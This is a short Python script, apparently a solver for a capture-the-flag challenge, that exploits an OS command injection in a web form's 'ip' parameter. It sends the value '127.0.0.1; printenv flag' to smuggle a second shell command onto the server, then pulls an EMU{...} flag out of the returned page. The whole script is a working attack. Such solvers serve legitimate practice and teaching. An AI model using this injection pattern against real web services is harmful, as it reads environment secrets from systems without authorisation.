#!/usr/bin/env python3
import html
import re
import sys
import urllib.parse
import urllib.request


base_url = sys.argv[1].rstrip("/")
query = urllib.parse.urlencode({"ip": "127.0.0.1; printenv flag"})
with urllib.request.urlopen(f"{base_url}/?{query}") as response:
    page = html.unescape(response.read().decode())

flag = re.search(r"EMU\{[^}]+}", page)
if not flag:
    raise SystemExit("flag not found")
print(flag.group())
